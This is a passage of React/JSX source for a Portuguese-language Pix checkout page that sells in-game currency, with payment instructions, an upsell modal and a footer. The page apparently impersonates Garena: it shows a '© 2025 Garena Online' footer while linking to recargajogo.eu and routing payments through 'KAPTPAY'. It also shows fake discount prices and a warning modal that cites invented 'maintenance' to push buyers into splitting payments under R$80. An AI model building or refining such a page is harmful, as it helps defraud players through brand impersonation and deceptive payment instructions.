                              )}
                            </div>
                          </div>
                        </div>
                      </div>

                      {/* Instruções de pagamento */}
                      <div className="text-gray-500 text-sm space-y-4">
                        <p className="font-semibold">Para realizar o pagamento siga os passos abaixo:</p>
                        <ol className="list-decimal list-inside space-y-2 pl-2">
                          <li>Abra o app ou o site da sua instituição financeira e seleciona o Pix.</li>
                          <li>Utilize as informações acima para realizar o pagamento.</li>
                          <li>Revise as informações e pronto!</li>
                        </ol>
                        <p>Seu pedido está sendo processado pelo nosso parceiro KAPTPAY.</p>
                        <p>Você receberá seus {config.coinName.toLowerCase()} após recebermos a confirmação do pagamento. Isso ocorre geralmente em alguns minutos após a realização do pagamento na sua instituição financeira.</p>
                        <p>Em caso de dúvidas entre em contato com o suporte.</p>
                      </div>
                    </>
                  )}

                  {/* Status de Expirado */}
                  {paymentStatus === 'expired' && (
                    <>
                      <div className="mb-4 p-4 bg-red-50 border border-red-200 rounded-lg">
                        <div className="flex items-center gap-2 text-red-800">
                          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                            <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
                          </svg>
                          <span className="font-medium">⏰ Tempo Expirado</span>
                        </div>
                        <p className="text-sm text-red-700 mt-1">
                          O tempo para pagamento expirou. Gere um novo PIX para continuar.
                        </p>
                      </div>

                      {/* Botão Gerar Novo PIX */}
                      <button
                        onClick={() => {
                          setShowPixInline(false)
                          setPixData(null)
                          setIsCopied(false)
                          setQrCodeImage("")
                          setTimerActive(false)
                          setTimeLeft(15 * 60)
                          setPaymentStatus('pending')
                        }}
                        className="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md transition-colors px-4 py-2 h-11 text-base font-bold w-full bg-blue-500 text-white hover:bg-blue-600"
                      >
                        Gerar Novo PIX
                      </button>
                    </>
                  )}

                  {/* Botão Voltar - Apenas para pending */}
                  {paymentStatus === 'pending' && timeLeft > 0 && (
                    <button
                      onClick={() => {
                        setShowPixInline(false)
                        setPixData(null)
                        setIsCopied(false)
                        setQrCodeImage("")
                        setTimerActive(false)
                        setTimeLeft(15 * 60)
                        setPaymentStatus('pending')
                      }}
                      className="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md transition-colors px-4 py-2 h-11 text-base font-bold w-full bg-gray-500 text-white hover:bg-gray-600 mt-4"
                    >
                      Voltar
                    </button>
                  )}
                </>
              ) : null}
            </div>
          )}
        </div>

        {!pixData && (
          <>
            <div className="text-gray-500 text-xs/normal mb-4">
              Ao clicar em "Prosseguir para Pagamento", atesto que li e concordo com os termos de uso e com a política de privacidade.
            </div>
            <button
              onClick={handleProceedToPayment}
              disabled={isProcessingPayment}
              className={`w-full font-bold py-3 px-4 rounded-xl transition-all duration-200 shadow-lg ${
                isProcessingPayment 
                  ? 'bg-gray-400 cursor-not-allowed text-white' 
                  : 'bg-red-500 hover:bg-red-600 text-white'
              }`}
            >
              {isProcessingPayment ? 'Processando...' : 'Prosseguir para Pagamento'}
            </button>
          </>
        )}
      </div>

      {/* Modal de Promoção */}
      {showPromoModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 p-4">
          <div className="bg-white rounded-lg shadow-lg w-full max-w-lg max-h-[90vh] overflow-y-auto flex flex-col">
            {/* Header */}
            <div className="p-6 pb-0">
              <h2 className="font-semibold text-center text-xl mb-2">Promoção Especial</h2>
              <p className="text-center text-sm text-gray-600 pt-2">
                Aproveite estas ofertas exclusivas para turbinar ainda mais sua conta!
              </p>
            </div>

            {/* Items List */}
            <div className="p-6 py-4 space-y-2 overflow-y-auto flex-1">
              {promoItems.map((item) => (
                <div
                  key={item.id}
                  onClick={() => togglePromoItem(item.id)}
                  className="flex items-center justify-between p-2 rounded-lg border cursor-pointer hover:bg-gray-50 transition-colors"
                >
                  <div className="flex items-center gap-3 pointer-events-none">
                    <div className="w-16 h-16 rounded-md overflow-hidden flex-shrink-0">
                      <img
                        src={item.image}
                        alt={item.name}
                        className="w-full h-full object-cover"
                      />
                    </div>
                    <div>
                      <p className="font-semibold text-sm">{item.name}</p>
                      <p className="text-xs text-gray-500">
                        <span className="line-through">R$ {item.oldPrice.toFixed(2).replace('.', ',')}</span>
                        <span className="text-red-600 font-bold ml-1.5">
                          R$ {item.price.toFixed(2).replace('.', ',')}
                        </span>
                      </p>
                    </div>
                  </div>
                  <div
                    className={`h-4 w-4 shrink-0 rounded-sm border transition-colors ${
                      selectedPromos.includes(item.id)
                        ? 'bg-red-600 border-red-600'
                        : 'border-gray-300'
                    }`}
                  >
                    {selectedPromos.includes(item.id) && (
                      <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                      </svg>
                    )}
                  </div>
                </div>
              ))}
            </div>

            {/* Footer */}
            <div className="p-6 pt-4 flex flex-col gap-4 border-t flex-shrink-0 bg-white">
              <div className="flex justify-between items-center font-bold text-lg">
                <span>Total:</span>
                <span>R$ {(getFinalPrice() + getPromoTotal()).toFixed(2).replace('.', ',')}</span>
              </div>
              <button
                onClick={handleFinalizeOrder}
                className="w-full h-12 text-lg font-bold bg-red-600 text-white rounded-md hover:bg-red-700 transition-colors"
              >
                Finalizar Pedido
              </button>
              <button
                onClick={() => {
                  setShowPromoModal(false)
                  setSelectedPromos([])
                  handleFinalizeOrder()
                }}
                className="w-full h-10 text-sm font-medium text-gray-700 hover:bg-gray-100 rounded-md transition-colors"
              >
                Não, obrigado
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal de Aviso (aparece na frente do modal de promoção) */}
      {showWarningModal && (
        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black bg-opacity-60 p-4">
          <div className="bg-white rounded-lg shadow-xl w-full max-w-md">
            {/* Header */}
            <div className="p-6 pb-4 border-b">
              <h3 className="text-lg font-bold text-center text-gray-800">⚠️ Atenção Importante</h3>
            </div>
            
            {/* Content */}
            <div className="p-6">
              <p className="text-sm text-gray-700 leading-relaxed">
                <span className="font-bold">Atenção:</span> devido a
                manutenções temporárias em alguns sistemas de pagamento no Brasil, 
                podem ocorrer <span className="font-semibold">instabilidades ao tentar pagar valores acima de R$80</span>.
                <br /><br />
                Caso encontre qualquer erro ou dificuldade ao efetuar o pagamento, 
                recomendamos <span className="font-semibold">selecionar um produto de valor inicial menor</span>.
                Dessa forma, o pagamento será processado normalmente.
                <br /><br />
                Se desejar, você pode realizar dois pedidos separados — 
                <span className="font-semibold">nossa equipe fará a entrega de todos os itens juntos diretamente via ID autenticado, sem custo adicional</span>.
              </p>
            </div>
            
            {/* Footer */}
            <div className="p-6 pt-0">
              <button
                onClick={() => setShowWarningModal(false)}
                className="w-full h-12 text-base font-bold bg-red-600 text-white rounded-md hover:bg-red-700 transition-colors"
              >
                Entendi
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Footer */}
      <footer className="bg-[#EFEFEF] text-gray-600">
        <div className="container mx-auto max-w-5xl px-4">
          <div className="flex flex-col items-center gap-3 p-4 text-center text-xs md:items-start max-md:pb-5">
            <div className="flex flex-col items-center gap-3 leading-none md:w-full md:flex-row md:justify-between">
              <div className="md:text-start">© 2025 Garena Online. Todos os direitos reservados.</div>
              <div className="flex shrink-0 flex-wrap items-center justify-center gap-x-4 gap-y-1">
                <a href="#" className="transition-opacity hover:opacity-70">FAQ</a>
                <div className="h-3 w-px bg-gray-300"></div>
                <a href="https://www.recargajogo.eu/legal/tos?utm_source=organicjLj68e076949be15d3367c027e6&utm_campaign=&utm_medium=&utm_content=&utm_term=" target="_blank" rel="noopener noreferrer" className="transition-opacity hover:opacity-70">Termos e Condições</a>
                <div className="h-3 w-px bg-gray-300"></div>
                <a href={addUtmsToUrl('/politica-privacidade')} target="_blank" className="transition-opacity hover:opacity-70">Política de Privacidade</a>
              </div>
            </div>
          </div>
        </div>
      </footer>

      <Toast
        isVisible={showToast}
        message={toastMessage}
        type={toastType}
        onClose={() => setShowToast(false)}
      />

    </div>
  )
}
